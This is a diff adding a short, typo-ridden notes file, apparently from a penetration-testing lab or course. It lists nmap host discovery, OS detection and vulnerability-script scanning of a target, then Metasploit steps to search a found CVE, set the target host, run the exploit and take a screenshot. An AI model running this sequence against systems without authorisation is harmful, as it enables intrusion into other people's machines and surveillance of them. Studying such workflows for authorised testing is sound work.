@@ -1,0 +1,12 @@
+nmap -sn {ur ip}
+nmap -O {host ip}
+nmap  --script vuln -p 455 { host ip }  [copy cve]
+msfconsole 
+search (coped cve)
+show option
+set rhosts {host ip}
+run
+shreenshot 
+exit 
+exit 
+
